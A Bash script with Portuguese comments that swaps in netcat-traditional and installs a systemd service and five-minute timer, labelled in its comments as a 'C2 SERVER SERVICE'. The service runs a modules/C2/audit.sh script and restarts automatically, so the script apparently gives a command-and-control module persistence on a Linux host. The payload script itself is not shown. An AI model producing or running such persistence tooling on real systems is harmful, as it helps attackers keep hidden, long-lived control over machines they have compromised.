#!/bin/bash

source .env

# Verificar se o script está sendo executado como root
if [ "$EUID" -ne 0 ]; then
    echo "Este script precisa ser executado como root."
    exit 1
fi

SERVER_SERVICE_NAME="nc.service"
TIMER_NAME="nc.timer"

sudo apt remove netcat-openbsd -y

# Verificar se o Netcat está instalado
if ! command -v nc &> /dev/null; then
    echo "Netcat não está instalado. Por favor, instale o Netcat e execute este script novamente."
    sudo apt install netcat-traditional -y
    exit 1
fi

# Criar arquivo de serviço para o C2 SERVER SERVICE
echo "[Unit]
Description=Netcat Service
After=network.target

[Service]
Type=simple
Restart=always
ExecStart=/bin/bash -c '$ACTUALL/modules/C2/audit.sh'
User=$USER

[Install]
WantedBy=multi-user.target" > "$SERVICE_FILE/$SERVER_SERVICE_NAME"

echo "[Unit]
Description=Netcat Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=5min

[Install]
WantedBy=timers.target
" > "$SERVICE_TIMER/$TIMER_NAME"

# Recarregar serviços do systemd
sudo systemctl daemon-reload

# Iniciar e habilitar o serviço nc
sudo systemctl unmask $SERVER_SERVICE_NAME
sudo systemctl start $SERVER_SERVICE_NAME
sudo systemctl enable $SERVER_SERVICE_NAME

echo "Configuração do serviço Netcat concluída no Servidor."